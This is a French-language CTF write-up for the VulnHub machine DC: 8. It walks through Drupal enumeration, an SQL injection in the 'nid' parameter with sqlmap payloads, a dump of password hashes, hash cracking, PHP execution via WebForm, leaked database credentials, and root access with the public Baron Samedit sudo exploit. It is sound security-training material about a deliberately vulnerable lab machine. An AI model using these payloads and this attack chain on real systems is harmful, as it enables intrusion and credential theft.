---
title: "Solution du CTF DC: 8 de VulnHub"
tags: [VulnHub, CTF]
---

Avant-dernier de la série (à l'heure de ces lignes), le [CTF DC: 8 de VulnHub](https://vulnhub.com/entry/dc-8,367/) indiquait qu'on croiserait de la 2FA sur le challenge, mais que l'on aurait à passer outre.

Dans tous les cas Nmap ne nous retourne qu'un SSH et en Drupal déployé sur le port 80.

## Wapiti à la rescousse

J'ai d'abord utilisé `droopescan` avec l'environnement Python 3.8 que j'avais mis en place dernièrement (on retrouve Drupal sur différentes VM de la série) :

```console
$ droopescan scan -u http://192.168.56.139/
[+] Site identified as drupal.
[+] Plugins found:                                                              
    ctools http://192.168.56.139/sites/all/modules/ctools/
        http://192.168.56.139/sites/all/modules/ctools/LICENSE.txt
        http://192.168.56.139/sites/all/modules/ctools/API.txt
    views http://192.168.56.139/sites/all/modules/views/
        http://192.168.56.139/sites/all/modules/views/README.txt
        http://192.168.56.139/sites/all/modules/views/LICENSE.txt
    webform http://192.168.56.139/sites/all/modules/webform/
        http://192.168.56.139/sites/all/modules/webform/README.md
        http://192.168.56.139/sites/all/modules/webform/LICENSE.txt
    ckeditor http://192.168.56.139/sites/all/modules/ckeditor/
        http://192.168.56.139/sites/all/modules/ckeditor/CHANGELOG.txt
        http://192.168.56.139/sites/all/modules/ckeditor/README.txt
        http://192.168.56.139/sites/all/modules/ckeditor/LICENSE.txt
    better_formats http://192.168.56.139/sites/all/modules/better_formats/
        http://192.168.56.139/sites/all/modules/better_formats/README.txt
        http://192.168.56.139/sites/all/modules/better_formats/LICENSE.txt
    profile http://192.168.56.139/modules/profile/
    php http://192.168.56.139/modules/php/
    image http://192.168.56.139/modules/image/

[+] Themes found:
    seven http://192.168.56.139/themes/seven/
    garland http://192.168.56.139/themes/garland/

[+] Possible version(s):
    7.67

[+] Possible interesting urls found:
    Default changelog file - http://192.168.56.139/CHANGELOG.txt
    Default admin - http://192.168.56.139/user/login
```

Quand on se rend sur _CVEDetails_ on remarque qu'aucune vulnérabilité connue n'est rattachée à cette version : [Drupal Drupal version 7.67 : Security vulnerabilities](https://www.cvedetails.com/vulnerability-list.php?vendor_id=1367&product_id=2387&version_id=288221&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&cweid=0&order=1&trc=1&sha=6c21cf91b2ccefa6ffb8eea8ef56ec64e8f96cb5)

J'ai trouvé un autre outil sur Github, mais il s'est avéré moins efficace :

```console
$ docker run --rm -it drupwn --mode enum --users --nodes --modules --dfiles --themes --target http://192.168.56.139/

        ____
       / __ \_______  ______ _      ______
      / / / / ___/ / / / __ \ | /| / / __ \
     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /
    /_____/_/   \__,_/ .___/|__/|__/_/ /_/
                     /_/
    
[-] Version not specified, trying to identify it

[+] Version detected: 7.0


============ Themes ============


============ Custom Themes ============


============ Default files ============

[+] /robots.txt (200)
[+] /README.txt (200)
[+] /LICENSE.txt (200)
[+] /web.config (200)
[+] /xmlrpc.php (200)
[+] /update.php (403)
[+] /install.php (200)

============ Modules ============


============ Custom Modules ============


============ Nodes ============

http://192.168.56.139//node/1
http://192.168.56.139//node/3
http://192.168.56.139//node/2

============ Users ============

[+] ***** (id=1)
[+] ***** (id=2)
```

J'ai énuméré les dossiers et fichiers sur le site, mais je n'ai trouvé que des dossiers spécifiques à Drupal :

{% raw %}
```
301        7l       20w      235c http://192.168.56.139/misc
301        7l       20w      237c http://192.168.56.139/themes
200      179l      425w     7972c http://192.168.56.139/0
200      170l      445w        0c http://192.168.56.139/user
301        7l       20w      238c http://192.168.56.139/modules
403      155l      347w     7056c http://192.168.56.139/search
403      158l      353w     7215c http://192.168.56.139/admin
301        7l       20w      238c http://192.168.56.139/scripts
200      156l      357w     7227c http://192.168.56.139/node
301        7l       20w      236c http://192.168.56.139/sites
403      155l      347w     7056c http://192.168.56.139/Search
301        7l       20w      239c http://192.168.56.139/includes
301        7l       20w      239c http://192.168.56.139/profiles
200      170l      445w        0c http://192.168.56.139/User
403      155l      347w     7055c http://192.168.56.139/Admin
403        9l       24w      217c http://192.168.56.139/Template
403      155l      347w     7056c http://192.168.56.139/SEARCH
403      159l      360w     7350c http://192.168.56.139/batch
403        9l       24w      219c http://192.168.56.139/Repository
403        9l       24w      212c http://192.168.56.139/Tag
```
{% endraw %}

Pas de modules Drupal vulnérables... Finalement j'ai lancé un scan Wapiti, car Drupal reste une application web et on n'est pas à l'abri qu'il y ait un module non listé qui soit vulnérable.

Dans mes recherches d'améliorations de Wapiti [j'avais d'ailleurs retrouvé des vulnérabilités dans des modules de différents CMS]({% link _posts/2020-02-03-One-crazy-month-of-web-vulnerability-scanning.md %}).

```bash
wapiti -u http://192.168.56.139/ -v2 --color
```

Le module `exec` remonte un warning. Cette erreur est souvent liée au backend qui interprète le point virgule.

```
[*] Launching module exec
[+] GET http://192.168.56.139/ (0)
[+] GET http://192.168.56.139/?nid=1 (1)
[¨] GET http://192.168.56.139/?nid=%3Benv%3B (1)
---
Received a HTTP 500 error in http://192.168.56.139/
Evil request:
    GET /?nid=%3Benv%3B HTTP/1.1
    host: 192.168.56.139
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: webform-3[1679520927]=1679520927; webform-3[1679520933]=1679520933; webform-3[1679520939]=1679520939; webform-3[1679520946]=1679520946; webform-3[1679520950]=1679520950
---
```

Finalement le module `sql` trouve une faille SQL error based :

```
[*] Launching module sql
[+] GET http://192.168.56.139/ (0)
[+] GET http://192.168.56.139/?nid=1 (1)
[¨] GET http://192.168.56.139/?nid=1%C2%BF%27%22%28 (1)
---
SQL Injection (DBMS: MySQL) in http://192.168.56.139/ via injection in the parameter nid
Evil request:
    GET /?nid=1%C2%BF%27%22%28 HTTP/1.1
    host: 192.168.56.139
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: webform-3[1679520927]=1679520927; webform-3[1679520933]=1679520933; webform-3[1679520939]=1679520939; --- snip ---; webform-3[1679521056]=1679521056
---
```

## Leak'n'Crack

J'enchaine naturellement avec `sqlmap` :

```bash
python sqlmap.py -u "http://192.168.56.139/?nid=1"
```

Ce dernier trouve plusieurs techniques pour l'exploitation. Avec l'utilisation du mot clé `UNION` ça ira très vite.

```
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: nid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: nid=1 AND 9687=9687

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: nid=1 AND (SELECT 9545 FROM(SELECT COUNT(*),CONCAT(0x7176717071,(SELECT (ELT(9545=9545,1))),0x716b787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: nid=1 AND (SELECT 6318 FROM (SELECT(SLEEP(5)))Vvbs)

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: nid=-5290 UNION ALL SELECT CONCAT(0x7176717071,0x5654526a5852726d6c696953786743676d5372714d5570524345456557586e47676c62776a74726f,0x716b787871)-- -
---
```

`sqlmap` m'indique que les requêtes sont exécutées avec le compte `dbuser@localhost` sur la base de données `d7db`. L'utilisateur a des privilèges restreints (`USAGE` sur cette db).

Je peux dumper la table des utilisateurs du *Joomla!*

```
Database: d7db                                                                                                                                                                                                   
Table: users
[3 entries]
+-----+---------+---------------------+---------------------------------------------------------+-----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+------------+------------+--------+---------+------------+--------------------+-----------+------------+------------------+
| uid | name    | init                | pass                                                    | mail                  | data                                                                                                                                                                        | theme   | login      | access     | status | picture | created    | timezone           | signature | language   | signature_format |
+-----+---------+---------------------+---------------------------------------------------------+-----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+------------+------------+--------+---------+------------+--------------------+-----------+------------+------------------+
| 0   | <blank> | <blank>             | <blank>                                                 | <blank>               | NULL                                                                                                                                                                        | <blank> | 0          | 0          | 0      | 0       | 0          | NULL               | <blank>   | <blank>    | NULL             |
| 1   | admin   | dc8blah@dc8blah.org | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z | dcau-user@outlook.com | a:2:{s:7:"contact";i:0;s:7:"overlay";i:1;}                                                                                                                                  | <blank> | 1567766626 | 1567766818 | 1      | 0       | 1567489015 | Australia/Brisbane | <blank>   | <blank>    | filtered_html    |
| 2   | john    | john@blahsdfsfd.org | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF | john@blahsdfsfd.org   | a:5:{s:16:"ckeditor_default";s:1:"t";s:20:"ckeditor_show_toggle";s:1:"t";s:14:"ckeditor_width";s:4:"100%";s:13:"ckeditor_lang";s:2:"en";s:18:"ckeditor_auto_lang";s:1:"t";} | <blank> | 1567497783 | 1567498512 | 1      | 0       | 1567489250 | Australia/Brisbane | <blank>   | <blank>    | filtered_html    |
+-----+---------+---------------------+---------------------------------------------------------+-----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+------------+------------+--------+---------+------------+--------------------+-----------+------------+------------------+
```

Le hash de `John` tombe avec la wordlist par défaut de _JtR_ :

```console
$ john hashes.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (Drupal7, $S$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:08 DONE 1/3 (2023-03-22 22:45) 0g/s 223.6p/s 224.3c/s 224.3C/s John1905..John1900
Proceeding with wordlist:./password.lst
Enabling duplicate candidate password suppressor
turtle           (john)
```

## RCE Drupal via WebForm

On peut alors se connecter au Drupal mais l'utilisateur n'est pas administrateur. On ne peut donc pas rajouter un bloc permettant l'exécution de code PHP.

J'ai fouillé un peu et j'ai finalement trouvé que la page de contact du site utilise un WebForm et qu'il est possible d'activer l'interprétation de code PHP sur le message qui apparait quand le formulaire de contact est remplit :

![Drupal WebForm PHP code execution](/assets/img/vulnhub/dc8_drupal_form_php_code.png)

J'en profite pour récupérer un shell. Je trouve les identifiants de la base de données :

```
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'd7db',
      'username' => 'dbuser',
      'password' => '4nB90JumP',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

Impossible de dire si le mot de passe est celui de l'utilisateur local `dc8user` car la 2FA est présente :

```console
www-data@dc-8:/tmp$ su dc8user
Verification code: 
Password: 
su: Authentication failure
```

Il n'y a pas grand-chose à dire sur le sujet. Elle est présente pour `su`, `ssh`, `scp` et aussi sur le terminal (depuis la fenêtre VirtualBox).

```console
www-data@dc-8:/tmp$ ls /etc/pam.d/
chfn  chpasswd  chsh  common-account  common-auth  common-password  common-session  common-session-noninteractive  cron  login  newusers  other  passwd  runuser  runuser-l  sshd  su  sudo  systemd-user
www-data@dc-8:/tmp$ grep google /etc/pam.d/*
/etc/pam.d/common-auth:auth required pam_google_authenticator.so
/etc/pam.d/sshd:auth required pam_google_authenticator.so
```

## Baron Samedit

Puisqu'il faut passer outre j'ai utilisé l'exploit [GitHub - worawit/CVE-2021-3156: Sudo Baron Samedit Exploit](https://github.com/worawit/CVE-2021-3156) :

```console
www-data@dc-8:/tmp/CVE-2021-3156$ python exploit_nss_d9.py
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
flag.txt
# cat flag.txt

Brilliant - you have succeeded!!!


888       888          888 888      8888888b.                             888 888 888 888
888   o   888          888 888      888  "Y88b                            888 888 888 888
888  d8b  888          888 888      888    888                            888 888 888 888
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888


Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I'm also sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

This challenge was largely based on two things:

1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.
2. A suggestion from @theart42

The answer to that question is...

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

Une autre LPE est possible en exploitant une vulnérabilité d'`Exim`.
